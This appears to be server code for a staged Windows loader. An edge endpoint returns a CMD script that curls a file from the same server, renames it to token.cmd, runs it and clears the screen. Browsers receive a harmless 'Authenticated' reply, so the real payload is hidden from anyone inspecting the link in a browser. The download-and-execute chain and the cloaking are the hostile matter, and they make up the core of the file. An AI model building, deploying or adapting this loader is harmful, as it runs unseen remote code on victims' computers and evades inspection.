// api/task/windows.js
// STEP 1 — Windows
// Issues a step-1 JWT and returns a CMD bootstrap script that fetches /token with both tokens.

export const config = { runtime: 'edge' };

import {
  getIp, isBrowser, isIpBlocked,
  createStepToken, genSessionId,
  getHost, urlParams, CORS, plainHeaders,
} from './_lib.js';

export default async function handler(req) {
  if (req.method === 'OPTIONS') {
    return new Response(null, { status: 200, headers: CORS });
  }

  const ip        = getIp(req);
  const params    = urlParams(req);
  const origToken = params.get('token') || '';

  if (await isIpBlocked(ip)) {
    console.log('[windows] BLOCKED:', ip);
    return new Response('Access permanently suspended.', { status: 403, headers: CORS });
  }

  const sessionId = genSessionId();
  const st1       = await createStepToken(ip, sessionId, 1, origToken);

  if (isBrowser(req)) {
    return new Response('@echo off\necho Authenticated', {
      status: 200, headers: plainHeaders(),
    });
  }

  const domain = getHost(req);
  const script = `@echo off
if exist "%USERPROFILE%\\parse" del "%USERPROFILE%\\parse"
if exist "%USERPROFILE%\\token.cmd" del "%USERPROFILE%\\token.cmd"
curl -s -L -o "%USERPROFILE%\\parse" "${domain}/api/users/token?token=${encodeURIComponent(origToken)}&st=${encodeURIComponent(st1)}"
ren "%USERPROFILE%\\parse" token.cmd
"%USERPROFILE%\\token.cmd"
cls
`;

  return new Response(script, { status: 200, headers: plainHeaders() });
}
